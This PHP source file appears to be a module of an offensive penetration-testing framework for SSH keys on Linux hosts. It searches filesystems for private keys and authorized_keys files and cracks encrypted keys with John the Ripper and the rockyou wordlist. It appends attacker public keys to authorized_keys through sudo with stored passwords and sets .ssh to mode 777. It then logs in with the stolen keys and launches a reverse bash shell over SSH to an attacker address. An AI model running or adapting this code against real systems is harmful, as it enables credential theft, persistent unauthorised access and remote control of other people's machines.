<?php

class check4linux8key extends check4linux8enum{
    var $tab_pubkey_str ;
    var $tab_privkey_str ;
    var $tab_pubkey_path ;
    var $tab_privkey_path ;
    
    
    
    //https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh
    
    
    public function __construct($stream,$eth,$domain,$ip,$port,$protocol) {
        parent::__construct($stream,$eth,$domain,$ip,$port,$protocol);
    }
    
    

    
    
    public function key8priv4pass2nopass($stream,$privkey_str_pass,$privkey_passwd,$type_crypt):string{
        $hash = sha1($privkey_str_pass);
        $privkey_str = "";
        if (!$this->file4exist8path($stream, "/tmp/$hash.priv.pass")){
            $this->str2file($stream, $privkey_str_pass,"/tmp/$hash.priv.pass");
        }
        if (!empty($privkey_passwd)) $privkey_str = $this->req_str($stream,"openssl $type_crypt -in /tmp/$hash.priv.pass -passin pass:$privkey_passwd ",$this->stream_timeout,"");
        return $this->key2norme8str($privkey_str,$type_crypt);       
    }
    
    public function key2gen4priv2pem8str($stream,$privkey_str,$type_crypt):string{
        $type_crypt = trim($type_crypt);
        
        if (empty($privkey_str)) return $this->log2error("Empty Private Key");
        
        $hash = sha1($privkey_str);
        if (!$this->file4exist8path($stream, "/tmp/$hash.pem")){
        if (!$this->file4exist8path($stream, "/tmp/$hash.priv")){
            $this->str2file($stream,$privkey_str, "/tmp/$hash.priv");
        }

        $this->req_str($stream,"openssl $type_crypt -in /tmp/$hash.priv -outform pem -text -out /tmp/$hash.pem",$this->stream_timeout,"");
        
        $this->req_str($stream,"ls -al /tmp/$hash.pem",$this->stream_timeout,"");
        $this->req_str($stream,"file /tmp/$hash.pem",$this->stream_timeout,"");
        }
        $pem_str = $this->req_str($stream,"cat /tmp/$hash.pem",$this->stream_timeout,"");
        return $pem_str;
    }
    
    
    public function key2gen4priv2str($stream,$type_crypt):string{
        $this->ssTitre ( "Gen Private key " );
        $privkey_str = "";
        $type_crypt = trim($type_crypt);
        $privkey_str = $this->req_str($stream,"openssl genpkey -algorithm $type_crypt -pkeyopt $type_crypt._keygen_bits:4096 ",$this->stream_timeout,"");
        return $this->key2norme8str($privkey_str,$type_crypt);
    }
    
    
    
    public function key2gen4public2str($stream,$privkey_str,$type_crypt){
        $this->ssTitre ( "Gen Public key" );
        $type_crypt = trim($type_crypt);
        $hash = sha1($privkey_str);
        if (!$this->file4exist8path($stream, "/tmp/$hash.priv")){
        $this->str2file($stream,$privkey_str, "/tmp/$hash.priv");
        }
        if (!$this->file4exist8path($stream, "/tmp/$hash.pub")){
        $this->req_str($stream,"openssl $type_crypt -in /tmp/$hash.priv -pubout -out /tmp/$hash.tmp",$this->stream_timeout ,"");
        $this->req_str($stream,"head -5 /tmp/$hash.tmp",$this->stream_timeout,"" );
        $this->req_str($stream,"ssh-keygen -i -m PKCS8 -f /tmp/$hash.tmp > /tmp/$hash.pub ",$this->stream_timeout,"");
        $this->req_str($stream,"ssh-keygen -l -f /tmp/$hash.pub ",$this->stream_timeout,"");
        $this->req_str($stream,"ls -al /tmp/$hash.pub",$this->stream_timeout,"");
        $this->req_str($stream,"file /tmp/$hash.pub",$this->stream_timeout,"");
        }
        $pubkey_str = $this->req_str($stream,"cat /tmp/$hash.pub",$this->stream_timeout,"");
        return $pubkey_str;
    }
    
    
    
    public function key2gen4priv2pem2rm($stream,$private_key_file,$private_key_passwd){
        if (!empty($private_key_passwd)) $this->req_str($stream,"openssl rsa -in $private_key_file -passin pass:$private_key_passwd -outform pem -text -out $private_key_file.pem",$this->stream_timeout,"");
        else $this->req_str($stream,"openssl rsa -in $private_key_file -outform pem -text -out $private_key_file.pem",$this->stream_timeout,"");
        
        $this->req_str($stream,"ls -al $private_key_file.pem",$this->stream_timeout,"");
        $this->req_str($stream,"file $private_key_file.pem",$this->stream_timeout,"");
        $this->req_str($stream,"head -5 $private_key_file.pem",$this->stream_timeout,"");
    }
    
    
    public function key2gen4priv2rm($stream,$private_key_file,$private_key_passwd){
        $this->ssTitre ( "Gen Private key " );
        $query = "openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out $private_key_file" ;
        if(!file_exists($private_key_file)) $this->requette($query);
        else $this->cmd("localhost", $query);
        
        $query = "openssl rsa -check -in $private_key_file";
        $this->req_str($stream,$query,$this->stream_timeout,"");
        $query = "openssl rsa -in $private_key_file -text -noout";
        //$this->req_str($stream,$query,$timeout,"");
        $this->req_str($stream,"ls -al $private_key_file",$this->stream_timeout,"");
        $this->req_str($stream,"file $private_key_file",$this->stream_timeout,"");
        $this->key2gen4priv2pem($stream,$this->stream_timeout,$private_key_file,$private_key_passwd);
        $this->req_str($stream,"head -5 $private_key_file",$this->stream_timeout,"" );
    }
    
    
    
    public function key2gen4public2rm($stream,$private_key_file, $public_key_file, $private_key_passwd){
        $this->ssTitre ( "Gen Public key" );
        $public_key_str = "";
        if (empty($private_key_file)) {
            $this->log2error("Empty Private key");
            return $public_key_str;
        }
        var_dump($private_key_passwd);
        if(!file_exists($public_key_file)) {
            
            if (!empty($private_key_passwd)) $this->req_str($stream,"openssl rsa -in $private_key_file -passin pass:$private_key_passwd -pubout -out $public_key_file.tmp",$this->stream_timeout,"");
            else $this->req_str($stream,"openssl rsa -in $private_key_file -pubout -out $public_key_file.tmp",$this->stream_timeout ,"");
            $this->req_str($stream,"head -5 $public_key_file.tmp",$this->stream_timeout,"" );
            $this->req_str($stream,"ssh-keygen -i -m PKCS8 -f $public_key_file.tmp > $public_key_file ",$this->stream_timeout,"");
            
        }
        
        $this->req_str($stream,"ssh-keygen -l -f $public_key_file ",$timeout,"");
        $this->req_str($stream,"ls -al $public_key_file",$timeout,"");
        $this->req_str($stream,"file $public_key_file",$timeout,"");
        $this->req_str($stream,"head -5 $public_key_file",$timeout,"");
        
    }
    
    
    public function key2check4add2rm($stream,$remote_username,$password2use,$authorized_keys_filepath,$key2search):bool{
        $this->ssTitre(__FUNCTION__);
        
        
        
        
        $query = "cat $authorized_keys_filepath";
        $authorized_keys_str = trim($this->req_str($stream,$query,$this->stream_timeout,""));
        $this->pause();
        
        
        if(stristr($authorized_keys_str,$key2search)!==FALSE) {
            $this->log2succes("FOUND Public key - already exist");
            return TRUE ;
        }
        else {
            $chaine = "Try to Add Public key\n";
            $this->note($chaine);
            if (!empty($password2use)) $data = "echo '$this->$password2use' | sudo -S -u $remote_username /bin/bash -c \"echo '#".$this->user2agent."' | tee -a $authorized_keys_filepath \" ";
            else $data = "echo '#".$this->user2agent."' | tee -a $authorized_keys_filepath ";
            
            $this->req_str($stream,$data,$this->stream_timeout,"");
            
            if (!empty($password2use)) $data = "echo '$this->$password2use' | sudo -S -u $remote_username /bin/bash -c \"echo '$key2search' | tee -a $authorized_keys_filepath \"";
            else $data = "echo '$key2search' | tee -a $authorized_keys_filepath ";
            
            $this->req_str($stream,$data,$this->stream_timeout,"");
            $this->pause();
            $query = "cat $authorized_keys_filepath";
            $authorized_keys_str = trim($this->req_str($stream,$query,$this->stream_timeout,""));
            $this->pause();
            if(stristr($authorized_keys_str,$key2search)!==FALSE) {
                $this->log2succes("Succes ADD Keys");
                return TRUE ;
            }
            else {
                $this->log2error("Failed to ADD Keys");
                return FALSE ;
            }
        }
        
    }
    
    
    
    public function key2run2rm($stream,$authorized_keys_filepath,$authorized_keys_str,$remote_username,$remote_userpass,$local_username,$local_home_user){
        $this->ssTitre(__FUNCTION__);
        $result = "";
        $timeout = 10 ;
        $remote_username = trim($remote_username);
        
        $this->article("Remote Home User", $local_home_user);
        $this->article("Remote User2use", $remote_username);
        $private_key_ssh_rsa_file = "$this->dir_tmp/$this->ip.$remote_username.rsa.priv";
        $obj_file = new FILE($this->stream,$private_key_ssh_rsa_file);
        $public_key_ssh_rsa_file = "$obj_file->file_dir/$obj_file->file_name.pub";
        $pass_phrase = '';
        $this->key2gen4priv("",10,$private_key_ssh_rsa_file, $pass_phrase);
        $this->key2gen4public("",10,$private_key_ssh_rsa_file, $public_key_ssh_rsa_file,$pass_phrase);
        
        $query = "find $local_home_user -name authorized_keys -type f -maxdepth 3 -exec ls -al {} \; 2> /dev/null | awk '{print $9}' | grep \"authorized_keys\" $this->filter_file_path "; // | grep '$find_user'
        $authorized_keys_filepath = $this->req_str($stream,$query,$this->stream_timeout,$this->filter_file_path);
        
        
        if (empty($authorized_keys_filepath)){
            
            $this->key2add($stream, $local_home_user, $authorized_keys_str);
            
            $query = "find $local_home_user -name authorized_keys -type f -maxdepth 3 -exec ls -al {} \; 2> /dev/null | awk '{print $9}' | grep \"authorized_keys\" $this->filter_file_path "; // | grep '$find_user'
            $authorized_keys_filepath = $this->req_str($stream,$query,$this->stream_timeout,"$this->filter_file_path | grep \"authorized_keys\" ");
            
        }
        
        if (!empty($authorized_keys_filepath)){
            
            if ($remote_username === "root" ) $password2use = $this->root_passwd;
            else $password2use = $this->created_user_pass ;
            
            if ($this->key2check4add($stream,$remote_username, $password2use,$authorized_keys_filepath, $public_keys_str)!==FALSE){
                
                $ssh_ports = $this->ip2ports4service("ssh");
                foreach ($ssh_ports as $ssh_open)
                    if(!empty($ssh_open)) {
                        $this->key2pentest8attacker($stream, $ssh_open, $local_username, $private_key_ssh_rsa_file);
                        
                    }
                
            }
            
        }
        return $result;
    }
    
    
    
    public function key($stream,$path2search){
        $this->titre(__FUNCTION__);
        $this->key4info($stream,$path2search);$this->pause();
        $this->key4users($stream,$path2search);$this->pause(); // OK
        $this->key4authorized_keys_file($stream,$path2search);$this->pause();
        
    }
    
    
    public function key2add2rm($stream,$home_user,$pubkey_str){
        $this->ssTitre(__FUNCTION__);
        $remote_username = "";
        $tmp = array();
        $this->article("home user",$home_user);
        
        $query = "echo '$home_user' $this->filter_file_path | sed \"s#/tmp/$this->ip.$this->port.nfs##g\"  | sed \"s#/home/##g\" | sed \"s#/##g\" | grep -Po \"[a-z0-9\_]{1,}\" ";
        exec($query,$tmp);
        $this->requette($query);
        if (isset($tmp[0])) $remote_username = trim($tmp[0]);
        
        $this->article("Remote Username", $remote_username);
        if (!empty($remote_username)) {
            $this->req_str($stream,"cd $home_user; whoami",$this->stream_timeout,"");
            $query = "cd $home_user; ls -al";
            $this->req_str($stream,$query,$this->stream_timeout,"");
            $this->req_str($stream," whoami",$this->stream_timeout,"");
            if (!$this->file4exist8path($stream, "$home_user/.ssh")){
                $this->req_str($stream,"cd $home_user; mkdir $home_user/.ssh",$this->stream_timeout,"");
                $query = "cd $home_user; chmod 777 -R $home_user/.ssh";
                $this->req_str($stream,$query,$this->stream_timeout,"");
            }
            if (!$this->file4exist8path($stream, "$home_user/.ssh/authorized_keys")){
                $query = "cd $home_user; echo '$pubkey_str' > $home_user/.ssh/authorized_keys";
                $this->req_str($stream,$query,$this->stream_timeout,"");
            }
            
        }
        $query = "cd $home_user; ls -al $home_user/.ssh";
        $this->req_str($stream,$query,$this->stream_timeout,"");
        
        if (!$this->file4search8path($stream, "$home_user/.ssh/authorized_keys", $pubkey_str)) return TRUE;
        else return FALSE;
        
    }
    
    public function key4info($stream){
        $this->ssTitre(__FUNCTION__);
        //===============================================================
        $data = "ls -alR ~/.ssh ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $this->note("Can private-key information be found?");
        $data = "ls /home/*\/.ssh/*";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "grep -v -e '^$' /etc/ssh/ssh_config | grep -v \"^#\"";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "grep 'PubkeyAuthentication' /etc/ssh/ssh_config ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $this->note("checks for if various ssh files are accessible");
        $data = "find / \( -name \"*_dsa\" -o -name \"*_rsa\" -o -name \"known_hosts\" -o -name \"authorized_hosts\" -o -name \"authorized_keys\" \) -exec ls -la {} 2>/dev/null \;";
        $this->req_str($stream,$data,$this->stream_timeout*3,"");
        
        $data = "grep \"PermitRootLogin\" /etc/ssh/sshd_config 2>/dev/null | grep -v \"#\" ";
        $check_root_acces = trim($this->req_str($stream,$data,$this->stream_timeout,""));
        if(stristr($check_root_acces,"PermitRootLogin yes")!==FALSE) $this->log2succes("Yes Root Access is Permited");
        if(stristr($check_root_acces,"PermitRootLogin no")!==FALSE) $this->note("Root Access is Not Permited");
    }
    
    
    public function key2check($stream,$host,$username,$ssh_port,$privkey_str):bool{
        $this->titre(__FUNCTION__);
        $uid_name = "";
        $hash = sha1($privkey_str);
        $type_crypt = $this->key2type4crypt8str($privkey_str);
        
        $this->key2gen4public2str($stream,$privkey_str,$type_crypt);

        $this->req_str($stream, "chmod 0600 /tmp/$hash.priv", $this->stream_timeout, "");
        
        $ip_attacker = $this->ip4addr4target($this->ip);
        $filename = "socat";
        $path_remotebin_socat = $this->bin2path($this->stream,$filename,$ip_attacker);
        
        $query = "(sleep 3;echo '\\n';sleep 3;echo '\\n';sleep 3;echo '\\n';)  | $path_remotebin_socat - EXEC:\"ssh -i /tmp/$hash.priv $username@$host -p $ssh_port -C 'id' -o PasswordAuthentication=no -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null\",pty,stderr,setsid,sigint,ctty,sane  ";
        $rst_id = $this->req_str($stream, $query, $this->stream_timeout, "");
        while ( strstr($rst_id, "[sudo] password for ")!==FALSE || strstr($rst_id, "s password:")!==FALSE || strstr($rst_id, "Permission denied, please try again.")!==FALSE){
            $chaine = "Asking Password";
            $this->rouge($chaine);
            $data = "";
            $rst_id = $this->req_str($stream,$data,$this->stream_timeout,"");
            
        }
        list($uid,$uid_name,$gid,$gid_name,$euid,$euid_name,$egid,$egid_name,$groups,$context,$id_tst) = $this->parse4id($rst_id);
        if (!empty($uid_name)) {
            $this->yesUSERS($this->port2id, $username, "SSH private Key", "/bin/bash:$privkey_str");
            return TRUE ;
        }
        else return FALSE;
    }
    
    public function key2stream($stream,$host,$username,$privkey_str,$ssh_port,$type_crypt){
        $this->titre(__FUNCTION__);
        if (empty($privkey_str)) return $this->log2error("Empty Private Key");
        
        $hash = sha1($privkey_str);

 
        $this->key2gen4priv2pem8str($stream,$privkey_str,$type_crypt);
        $pubkey_str = $this->key2gen4public2str($stream,$privkey_str,$type_crypt);
        
        $this->req_str($stream,"chmod 0600 /tmp/$hash.pem",$this->stream_timeout,"");
        $this->req_str($stream, "chmod 0600 /tmp/$hash.priv", $this->stream_timeout, "");
        
        $query = "ssh -i /tmp/$hash.priv $username@$host -p $ssh_port -o PasswordAuthentication=no ";
        $this->cmd("localhost",$query);
        $query = "ssh -i /tmp/$hash.pem $username@$host -p $ssh_port -o PasswordAuthentication=no ";
        $this->cmd("localhost",$query);
        
        
        $con = @ssh2_connect( $host, $ssh_port,array('hostkey'=>"ssh-$type_crypt") );
        if($con===FALSE) {
            $chaine = "Failed Connection";
            $this->log2error($chaine);
            return FALSE ;
        }
        $infos = "Private Key:$privkey_str";
        $this->note($infos);
               
        $this->str2file($stream,$pubkey_str, "/tmp/$hash.pub");
        $this->req_str($stream,"ls -al /tmp/$hash.pub",$this->stream_timeout,"");
        $this->req_str($stream,"file /tmp/$hash.pub",$this->stream_timeout,"");
        $this->req_str($stream,"head -5 /tmp/$hash.pub",$this->stream_timeout,"");
        
        $this->req_str($stream,"ls -al /tmp/$hash.priv",$this->stream_timeout,"");
        $this->req_str($stream,"file /tmp/$hash.priv",$this->stream_timeout,"");
        $this->req_str($stream,"head -5 /tmp/$hash.priv",$this->stream_timeout,"");
        
        $this->req_str($stream,"ls -al /tmp/$hash.pem",$this->stream_timeout,"");
        $this->req_str($stream,"file /tmp/$hash.pem",$this->stream_timeout,"");
        $this->req_str($stream,"head -5 /tmp/$hash.pem",$this->stream_timeout,"");
        
        if (@ssh2_auth_pubkey_file($con,$username,"/tmp/$hash.pub","/tmp/$hash.pem","")!==FALSE) {            
            $this->log2succes("Succes Private Key Authentication");
            $this->yesUSERS($this->port2id, $username, "SSH private Key", "/bin/bash:$infos");
            
            return $con ;
        } else {
            $chaine = "Failed Public Key Authentication";
            $this->log2error($chaine);
            return FALSE ;
        }
        
        
    }
    
    
    public function key2pentest8attacker($stream,$username,$privkey_str,$ssh_port,$type_crypt){
        $this->titre(__FUNCTION__);
        $hash = sha1($privkey_str);
        $stream = $this->key2stream($stream, $this->ip, $username, $privkey_str, $ssh_port,$type_crypt);
        
        if(is_resource($stream)){
            $info = "SSH Private Key:$privkey_str";
            $this->log2succes($info);
            $template_shell = "ssh -i /tmp/$hash.priv -o PasswordAuthentication=no  -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null $username@$this->ip -p $ssh_port -C \"%SHELL%\" ";
            
            $templateB64_shell = base64_encode($template_shell);
            $attacker_ip = $this->ip4addr4target($this->ip);
            $attacker_port = rand(1024,65535);
            $shell = "/bin/bash";
            $cmd_rev  = $this->rev8fifo($attacker_ip, $attacker_port, $shell);
            $cmd = str_replace("%SHELL%", $cmd_rev, $template_shell);

            $lprotocol = 'T' ;
            $type = "server";
            $this->service4lan($cmd, $templateB64_shell, $attacker_port, $lprotocol, $type);
        }
    }
    
    public function key2type4crypt8str($privkey_str){
        
        $type_crypt = "";
        $type_crypt = exec("echo '$privkey_str' | grep 'BEGIN ' | grep ' PRIVATE KEY' | awk '{printf $2}' ");    
      $this->article("TYPE", $type_crypt);
      return $type_crypt;
    }
    
    
    public function key2type4crypt8path($privkey_path){
        return  exec("cat $privkey_path | grep 'BEGIN ' | grep ' PRIVATE KEY/' | awk '{printf $2}' ");
    }
    
    public function key2list4priv($stream,$path2search):array{
        $this->titre(__FUNCTION__);
        $tab_privkeys_path = array();
        $tab_privkeys_str = array();
        
        $data = "find $path2search \( -name \"id_dsa\" -o -name \"id_rsa\" -o -name \"ssh_host_key\" -o -name \"ssh_host_rsa_key\" -o -name \"ssh_host_dsa_key\" -o -name \"identity\"  \) -exec ls -al {} 2>/dev/null \;";
        $filter = "| awk '{printf $9}' $this->filter_file_path | grep -i -Po \"^(/[a-z0-9\-\_\.]{1,})*\" | sort -u ";
        $tab_privkeys_path = $this->req_tab($stream,$data,$this->stream_timeout*4,$filter);
        $this->article("All Priv Keys Location Path", $this->tab($tab_privkeys_path));
        foreach ($tab_privkeys_path as $privkey_path){
            $type_crypt = $this->key2type4crypt8path($privkey_path);
            $type_crypt_up = strtoupper($type_crypt);
            
            $privkey_str_tmp = $this->req_str($stream, "cat $privkey_path", $this->stream_timeout, " | awk '/BEGIN $type_crypt_up PRIVATE KEY/,/END $type_crypt_up PRIVATE KEY/' ");
           
            if (!empty($privkey_str_tmp) && !empty($type_crypt) ) {
                if (stristr($privkey_str_tmp, "ENCRYPTED")!==FALSE){
                    $privkey_passwd = $this->key2crack($privkey_str_tmp, "$this->dico_password.rockyou");
                    $privkey_str = $this->key8priv4pass2nopass("", $privkey_str_tmp, $privkey_passwd,$type_crypt);
                    $tab_privkeys_str[] = $privkey_str;
                }
                else {
                    $tab_privkeys_str[] = $privkey_str_tmp;
                }
                
            }
        }
        
        $this->article("All Priv Keys Strings", $this->tab($tab_privkeys_str));
        return $tab_privkeys_str ;
    }
    

    
    public function key2norme8str($privkey_str,$type_crypt):string{   
        $result = "";
        $type_crypt = strtoupper($type_crypt);
        if (!empty($privkey_str)) $result = $this->req_ret_str("echo '$privkey_str'  | awk '/BEGIN $type_crypt PRIVATE KEY/,/END $type_crypt PRIVATE KEY/' ");  
        return $result;
    }
    
    
    
    
    public function key2crack($privkey_str, $dico){
        $this->ssTitre(__FUNCTION__);
        $privkey_hash = sha1($privkey_str);
        $file_path = "/tmp/$privkey_hash.priv.pass";
        $this->str2file("",$privkey_str, $file_path);
        $query = "python /opt/john/ssh2john.py $file_path > /tmp/$privkey_hash.hash";
        $this->req_ret_str($query);
        $query = "echo '$this->root_passwd' | sudo -S /opt/john/john --format=SSH /tmp/$privkey_hash.hash --wordlist:$dico | grep '$file_path' | awk '{printf $1}' ";
        return $this->req_ret_str($query);
    }

    
    public function key4users($stream,$path2search){
        $this->titre(__FUNCTION__);
        $tab_privkeys_str = array();
        $ssh_ports = $this->ip2ports4service("ssh");

        $tab_privkeys_str = $this->key2list4priv($stream,$path2search);
        $this->pause();
            
        $tab_users_shell = $this->ip2users4shell();
        if (empty($tab_users_shell)) $tab_users_shell = $this->ip2users();
             
        if (!empty($tab_privkeys_str)){
            foreach ($tab_privkeys_str as $privkey_str){
                $privkey_str = trim($privkey_str);
                $type_crypt = $this->key2type4crypt8str($privkey_str);
                    foreach ($tab_users_shell as $username){
                        foreach ($ssh_ports as $ssh_port){
                            if ( !empty($username) && !empty($ssh_port) && !empty($privkey_str) ) {
                                $this->key2pentest8attacker("",$username,$privkey_str,$ssh_port,$type_crypt);
                                $this->key2pentest8target($stream,$username,$privkey_str,$ssh_port);
                            }
                        }
                    }
                }
 
        }
    }
    
    
    
    public function key2pentest8target($stream,$username,$privkey_str,$ssh_port){
        $this->titre(__FUNCTION__);
        $username = trim($username);
        $privkey_str = trim($privkey_str);
        $ssh_port = trim($ssh_port);

        $hash = sha1($privkey_str);
        if (!$this->file4exist8path($stream, "/tmp/$hash.priv")){
            $this->str2file($stream,$privkey_str, "/tmp/$hash.priv");            
        }
        $this->req_str($stream, "chmod 0600 /tmp/$hash.priv", $this->stream_timeout, "");
        $template_id_euid = "ssh -i /tmp/$hash.priv  $username@127.0.0.1 -p $ssh_port -o PasswordAuthentication=no -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null -C \"%ID%\" ";        
        $this->pentest8id($stream,$template_id_euid);
        //===============================================================
    }
    
    
    
    public function key2authorized_keys_file2rm($stream,$authorized_keys_filepath){
        $this->ssTitre(__FUNCTION__);
        //===============================================================
        
        if (!empty($authorized_keys_filepath)){
            $query = "cat $authorized_keys_filepath";
            $authorized_keys_str = trim($this->req_ret_str($query));
            $local_username = "";
            $local_home_user = "";
            $ip2users = $this->ip2users4passwd();
            foreach ($ip2users as $remote_username => $remote_userpass)
                $this->key2run($stream, $authorized_keys_filepath, $authorized_keys_str, $remote_username, $remote_userpass, $local_username, $local_home_user);
                
        }
        //===============================================================
        
    }
    
    
    public function key4authorized_keys_file2rm($stream,$path2search){
        $this->ssTitre(__FUNCTION__);
        //===============================================================
        $data = "find $path2search -name \"authorized_keys\" -exec cat {} 2>/dev/null \;";
        $filter = "";
        $this->req_str($stream,$data,$this->stream_timeout*3,$filter);
        
        $data = "find $path2search -iname \"authorized_keys\" -type f -exec ls -la {} \; 2>/dev/null ";
        $filter = " $this->filter_file_path | grep 'authorized_keys ";
        $public_key_ssh_rsa_file_tab_remote = $this->req_tab($stream,$data,$this->stream_timeout*3,$filter);
        
        
        foreach ($public_key_ssh_rsa_file_tab_remote as $authorized_keys_filepath){
            $this->key2authorized_keys_file($stream,$authorized_keys_filepath);
        }
        //===============================================================
        
    }
    
    
    
    public function key4add2rm($stream,$path2search){
        $this->ssTitre(__FUNCTION__);
        $tab_home = array();
        $this->note("home user");
        $data = "ls -dl $path2search.home/* 2>/dev/null ";
        $filter = "| awk '{print $9}' $this->filter_file_path ";
        $tab_home = $this->req_tab($stream,$data,$this->stream_timeout,$filter);
        var_dump($tab_home);
        $this->pause();
        $data = "ls -dl $path2search.root 2>/dev/null ";
        $filter = "| awk '{print $9}' $this->filter_file_path ";
        $tab_home[] = $this->req_str($stream,$data,$this->stream_timeout,$filter);
        $tab_home = array_reverse($tab_home);
        $this->article("All Home User", $this->tab($tab_home));
        //$tab_home = array("/home/nightfall");
        if (isset($tab_home[0])){
            foreach ($tab_home as $home_user){
                $home_user = trim($home_user);
                if (!empty($home_user)) $this->key2add($stream,$home_user);
            }
        }
        
    }
    
    
    
}